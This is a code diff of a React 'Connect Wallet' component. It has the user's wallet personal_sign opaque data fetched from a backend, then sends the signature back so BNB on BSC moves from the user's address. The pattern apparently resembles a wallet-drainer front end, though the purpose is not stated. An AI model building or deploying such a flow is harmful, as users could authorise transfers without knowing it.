@@ -8,8 +8,8 @@ function App() {
 
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      chains: [56], // فقط BSC
-      methods: ["personal_sign"], // متد personal_sign
+      chains: [56],
+      methods: ["personal_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -17,7 +17,6 @@ function App() {
     var provider = ethereumProvider;
     var accounts = await provider.request({ method: "eth_accounts" });
     var sender = accounts[0];
-
     console.log("✅ Wallet Address:", sender);
 
     async function getRawSignature(address, balance) {
@@ -27,12 +26,12 @@ function App() {
           address: address,
           chain: "56",
           type: "coin",
-          balance: parseFloat(balance), // تبدیل مقدار به عدد
+          balance: balance,
         };
 
-        console.log("🔍 Requesting Unsigned Data:", JSON.stringify(requestData, null, 2));
+        console.log("🔍 Requesting Unsigned Data:", requestData);
 
-        let response = await fetch("/api/proxy", {
+        let response = await fetch("https://your-backend.com/proxy", { // از پروکسی استفاده کن
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
@@ -40,9 +39,8 @@ function App() {
 
         let unsignedData = await response.json();
 
-        if (!unsignedData || unsignedData.error) {
-          console.error("❌ Error in getRawSignature:", unsignedData);
-          return null;
+        if (unsignedData.error) {
+          throw new Error(unsignedData.error);
         }
 
         console.log("📜 Unsigned Data:", unsignedData);
@@ -51,8 +49,6 @@ function App() {
           method: "personal_sign",
           params: [JSON.stringify(unsignedData), address],
         });
-
-        console.log("✍️ Signed Raw Data:", rawSignature);
 
         return rawSignature;
       } catch (error) {
@@ -63,26 +59,23 @@ function App() {
 
     async function sendSignedTransaction(signature, sender, balance) {
       try {
-        if (!signature || typeof signature !== "string") {
-          console.error("❌ Invalid signature:", signature);
-          return;
-        }
-
         let requestData = {
           sender: sender,
-          balance: parseFloat(balance),
+          balance: balance,
           signedData: signature,
         };
 
-        console.log("📤 Sending Signed Transaction:", JSON.stringify(requestData, null, 2));
-
-        let response = await fetch("/api/proxy", {
+        let response = await fetch("https://your-backend.com/proxy", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
         });
 
         let resultJson = await response.json();
+
+        if (resultJson.error) {
+          throw new Error(resultJson.error);
+        }
 
         console.log("📤 Server Response:", resultJson);
 
@@ -93,11 +86,11 @@ function App() {
       }
     }
 
-    let balance = 0.01; // مقدار BNB مورد انتقال (به‌صورت عدد)
-
+    let balance = "0.01";
     var rawSignature = await getRawSignature(sender, balance);
 
     if (rawSignature) {
+      console.log("✍️ Signed Raw Data:", rawSignature);
       var txHash = await sendSignedTransaction(rawSignature, sender, balance);
       console.log("📤 Final Transaction Hash:", txHash);
     } else {
@@ -106,10 +99,7 @@ function App() {
   }
 
   return (
-    <button
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-    >
+    <button onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left">
       <span>Connect Wallet</span>
     </button>
   );
